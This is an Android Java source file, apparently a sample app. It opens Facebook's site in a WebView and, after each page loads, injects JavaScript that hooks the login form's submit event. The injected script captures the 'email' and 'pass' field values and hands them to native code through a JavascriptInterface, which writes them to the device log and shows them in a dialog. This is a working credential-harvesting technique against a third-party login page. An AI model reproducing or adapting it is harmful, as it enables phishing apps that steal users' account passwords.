package example.henrychuang.sample;


import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;


public class Main extends Activity {
    WebView webview1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        webview1 = (WebView)findViewById(R.id.myWebview);

        webview1.getSettings().setJavaScriptEnabled(true);
        webview1.addJavascriptInterface(new MyJavaScriptInterface(), "MYOBJECT");
        webview1.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                StringBuilder sb = new StringBuilder();
                sb.append("document.getElementsByTagName('form')[0].onsubmit = function () {");
                sb.append("var objPWD, objAccount;var str = '';");
                sb.append("var inputs = document.getElementsByTagName('input');");
                sb.append("for (var i = 0; i < inputs.length; i++) {");
		        sb.append("if (inputs[i].name.toLowerCase() === 'pass') {objPWD = inputs[i];}");
		        sb.append("else if (inputs[i].name.toLowerCase() === 'email') {objAccount = inputs[i];}");
                sb.append("}");
                sb.append("if (objAccount != null) {str += objAccount.value;}");
                sb.append("if (objPWD != null) { str += ' , ' + objPWD.value;}");
                sb.append("window.MYOBJECT.processHTML(str);");
//                sb.append("window.MYOBJECT.processHTML(document.getElementsByTagName('form')[0].innerHTML);");

                sb.append("return true;");
                sb.append("};");

                view.loadUrl("javascript:" + sb.toString());
            }

        });

        String sUrl = "https://www.facebook.com/";
        webview1.loadUrl(sUrl);

    }

    class MyJavaScriptInterface
    {
        @JavascriptInterface
        public void processHTML(String html)
        {
            Log.d("henrytest", html);

            AlertDialog.Builder builder = new AlertDialog.Builder(Main.this);
            builder.setTitle("AlertDialog from app")
                    .setMessage(html)
                    .setPositiveButton(android.R.string.ok,
                            new DialogInterface.OnClickListener() {

                                @Override
                                public void onClick(DialogInterface dialog, int which) {
                                    // TODO Auto-generated method stub

                                }
                            })
                    .setCancelable(false).show();

        }
    }

}
